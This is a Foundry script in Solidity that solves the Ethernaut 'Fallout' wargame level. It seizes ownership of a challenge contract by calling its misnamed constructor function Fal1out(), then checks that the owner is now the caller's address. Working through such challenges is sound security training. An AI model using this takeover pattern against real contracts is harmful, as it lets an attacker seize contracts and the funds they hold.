// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(0xEc14D55b1556005b10Ba389c09Cfdc120254B10E);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        falloutInstance.Fal1out();
        vm.stopBroadcast();
        require(falloutInstance.owner() == vm.envAddress("MY_ADDRESS"));
    }
}